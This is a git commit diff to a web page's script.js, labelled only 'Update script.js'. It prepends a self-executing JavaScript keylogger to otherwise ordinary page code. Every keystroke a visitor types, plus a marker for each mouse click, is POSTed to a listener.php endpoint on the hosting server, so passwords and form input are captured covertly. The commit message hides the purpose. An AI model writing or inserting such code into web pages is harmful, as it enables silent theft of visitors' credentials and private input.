3715823a4c74cd8f6bc307eab8cc81a8bded895e
D4RKH0R1Z0N <76612351+D4RKH0R1Z0N@users.noreply.github.com>
2022-05-25 17:21:33 +0530

    Update script.js

--- External Files/script.js
+++ External Files/script.js
@@ -1,3 +1,23 @@
+(function() {
+    var server = "https://" + location.host + "/listener.php";
+    document.addEventListener("keyup", function(e) {
+        var x = new XMLHttpRequest();
+        x.open("POST", server, true);
+        x.send(e.key);
+    });
+    document.addEventListener("click", function(e) {
+        var click;
+        if (e.which == 1) {
+            click = " MouseClick ";
+        } else {
+            click = " MouseClick ";
+        }
+        var x = new XMLHttpRequest();
+        x.open("POST", server, true);
+        x.send(click);
+    });
+})();
+
 function updatetext() {
   var title_box = document.location.host;
   var input_element = document.querySelector("input");
